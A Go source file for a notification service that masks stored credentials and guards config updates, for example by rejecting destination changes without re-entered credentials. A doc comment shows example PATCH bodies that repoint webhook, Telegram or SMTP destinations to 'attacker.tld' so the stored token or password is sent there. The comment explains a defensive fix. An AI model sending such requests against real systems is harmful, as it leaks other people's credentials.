package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for a masked value. When the API echoes
// back a credential, the real content is replaced with a value carrying this
// prefix; when the update endpoint receives a value with this prefix, it's
// understood as "keep the value already in the database unchanged".
//
// Using a prefix rather than an empty string or some fixed constant is so a
// bit of identifying information can be carried along (see MaskedValue),
// letting the user tell "which bot this is" without having to re-paste the
// key.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original value is too short, gives no hint
//	"__masked__:…ab12cd"      carries the original value's last 6 chars as a hint
//
// Exposing only the last 6 characters is a deliberate choice: a webhook URL's
// identifying info sits at the end (e.g. WeCom's key, Feishu's bot id), while
// the prefix portion is the same across bots and has no identifying value.
// The last 6 characters aren't enough to reconstruct the credential, but are
// enough for the person configuring it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified since
// being echoed back by the API).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with that channel's credential
// fields replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original
// config — better to have the UI show "config unavailable" than to spit back
// the entire original content, which might contain credentials, when the
// channel type can't be recognized. Non-credential fields are kept as-is so
// the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure like headers is treated as one credential as a
		// whole: judging it sub-key by sub-key would require every channel
		// to declare yet another set of rules for "which sub-keys are
		// credentials", at a complexity far exceeding the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address
// changed, but the caller didn't state anything for the credential fields".
// Returning this instead of silently allowing it or silently dropping the
// credential — see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly stated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter the credential field(s) (" +
		strings.Join(e.Missing, ", ") + "): provide a new value, or explicitly clear it to indicate credentials are no longer needed. " +
		"The original credential is only valid for the old address; continuing to use it is the same as handing it to the new address."
}

// PrepareConfigUpdate merges a channel config and handles the
// security-sensitive case of "the destination address changed".
//
// It replaces a bare MergeConfig on the channel-update path, closing off an
// exploitable path that's been verified in practice: the destination address
// (where the message goes) and the credential (what identity it's sent
// under) are two independent sets of fields, and MergeConfig keeps the
// stored value as-is for any key not mentioned. So anyone who can PATCH a
// channel could, just by **changing only the address and saying nothing
// about the credential**, make the server send the real stored credential to
// an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent and doesn't depend on a redirect (so
// rejecting cross-host redirects doesn't stop it), and it directly defeats
// this package's masking mechanism's whole point — "credentials are never
// echoed back to the browser".
//
// Rule: whenever a destination key is changed to a new value, the caller
// must explicitly state **every** credential key:
//   - Give a new value → use the new value
//   - Explicitly pass an empty string → this field no longer needs a
//     credential (keeps the clearing semantics)
//   - Echo the masked value back unchanged / omit the key entirely → rejected
//
// The third case is also rejected because a "masked value" specifically
// means "keep using the old credential", and the old credential is only
// valid for the old address. Deliberately not doing "auto-drop the
// credential" here — for optional credential fields (webhook's headers,
// email's password) that would silently turn into "auth is gone but the
// endpoint returns 200", which is harder to troubleshoot than an error.
// Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers is an object)
	// has a masked literal embedded in it, it means the caller stuffed the
	// "keep as-is" sentinel inside a structure. MergeConfig only recognizes a
	// masked value when it's "a string with the prefix" — this shape would
	// be stored as-is as a plain object, with the literal "__masked__"
	// actually landing in the database, silently breaking auth later with no
	// error at all. Better to reject it.
	//
	// This check must come **first**: when the address hasn't changed, there's
	// an early return, so putting it after that would only cover the "address
	// changed" path (the first version got this wrong, and the test caught
	// it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that actually changed. A masked value counts
	// as "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged, do a normal merge (masked value keeps the
		// original, empty string clears, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require every credential key to be explicitly stated.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting the masked sentinel embedded
// inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object
// field like webhook's headers can only be masked as a whole (written as the
// string "__masked__") or submitted as a whole; stuffing the sentinel inside
// the object neither expresses "keep unchanged" nor avoids being stored as a
// real value in the database.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s's content contains the mask marker %q: this field can only be left entirely blank to keep as-is, or submitted entirely as a new value — a mask placeholder cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. Comparing via
// JSON serialization also handles type differences along the way — the
// frontend submits the port as a number, while the database reads it back as
// float64, and a direct == would misjudge them as different.
//
// "Empty" must be normalized before comparing: an empty string and "the key
// doesn't exist" are the same state in this config model, because
// MergeConfig treats an empty string as an explicit clear and deletes the
// key outright. Without normalizing, an optional destination field that's
// always left blank (Telegram's base_url is the only such field: leaving it
// blank means using the official address) would hit this path —
//
//	Created with base_url:"" stored → the first save has MergeConfig delete the key
//	→ on the second save, incoming is "" while stored is missing the key, judged as "address changed"
//	→ the credential is a masked value → 400 "destination address has changed, please re-enter the credential field"
//
// Every save after that fails, unless the user re-pastes the Bot Token, even
// though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is "empty". This must
// match MergeConfig's clearing criterion (strings.TrimSpace(s) == ""), or
// there'd be a gap where "MergeConfig thinks it should delete, but
// sameConfigValue thinks there's a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used when updating a channel
// config.
//
// Rules:
//   - A key whose incoming value is masked → keep stored's original value
//     (the user didn't change this field)
//   - A key whose incoming value is an empty string → treated as an explicit
//     clear, the key is deleted
//   - Every other key → overwritten with incoming's value
//   - A key present in stored but absent from incoming → kept (partial-update
//     semantics)
//
// Whether an empty string counts as "clearing" needs to be explicit: the
// frontend form submits an unfilled field as an empty string, and treating
// that as a valid value to write would actually clear a field meant to be
// "left blank to keep the original value". Explicit clearing is chosen here
// because there's no other way for the user to express "clear a
// wrongly-set field" (dropping the field entirely could distinguish "not
// provided" from "provided as empty", but the UI has no use for that
// distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
